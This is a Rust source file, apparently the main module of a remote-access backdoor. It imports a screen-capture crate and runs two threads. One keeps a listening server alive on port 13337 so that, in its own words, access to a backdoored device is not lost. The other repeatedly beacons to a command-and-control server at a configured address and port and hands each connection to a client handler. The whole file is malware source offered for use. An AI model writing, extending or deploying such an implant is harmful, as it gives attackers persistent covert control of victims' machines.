#[macro_use]
extern crate failure;
extern crate scrap;

use crate::communication::server::handle_client;
use crate::logging::core::{setup_logging, LoggingConfiguration};
use log::{debug, error, info};
use std::net::TcpStream;
use std::{thread, time};

pub mod actions;
pub mod communication;
pub mod logging;

const RETRY_INTERVAL: time::Duration = time::Duration::from_secs(5);
const SERVER_LISTENING_PORT: u16 = 13337;

const CNC_SERVER_IP: &str = "127.0.0.1";
const CNC_SERVER_PORT: u16 = 9393;

fn run_server_loop() {
    // Using loop here because in case we fail to create the server, we should try again.
    // This is because we don't want to lose access to a device we have a backdoor on.
    loop {
        debug!("Running server loop");
        // Blocking until server will die.
        match communication::server::run_server(SERVER_LISTENING_PORT) {
            Ok(_) => (),
            Err(e) => {
                error!(
                    "Error {} when starting server. Trying again in {} seconds.",
                    e,
                    RETRY_INTERVAL.as_secs()
                );
            }
        }
        debug!(
            "Sleeping {} seconds until retrying to run server again",
            RETRY_INTERVAL.as_secs()
        );
        thread::sleep(RETRY_INTERVAL);
    }
}

fn run_cnc_connection_loop() {
    loop {
        let server_address = format!("{}:{}", CNC_SERVER_IP, CNC_SERVER_PORT);
        match TcpStream::connect(&server_address) {
            Ok(stream) => {
                info!(
                    "Successfully connected to cnc server {}!",
                    stream.peer_addr().unwrap().to_string()
                );
                thread::spawn(move || {
                    // connection succeeded
                    handle_client(stream)
                });
            }
            Err(e) => {
                error!(
                    "Failed to connect to cnc server ({}), error: {}",
                    &server_address, e
                );
            }
        }
        std::thread::sleep(RETRY_INTERVAL)
    }
}

fn init_logging() {
    setup_logging(LoggingConfiguration {
        to_stdout: true,
        to_memory: true,
        // Allow max 4096 characters to be written to log memory
        // This is 4096 * 4 = 16kb.
        max_memory_log_size_bytes: 4096 * std::mem::size_of::<char>(),
        level: log::LevelFilter::Debug,
    })
    .unwrap();
}

fn main() {
    // TODO add command line parameters to control logging
    init_logging();
    log::info!("Logging successfully initialized");

    // Support several ways of communication - cnc remote server + local server listening on port.
    let server_handler = thread::spawn(run_server_loop);
    let cnc_connect = thread::spawn(run_cnc_connection_loop);

    cnc_connect
        .join()
        .expect("The cnc connection has panicked.");
    server_handler
        .join()
        .expect("The server connection has panicked.");
}
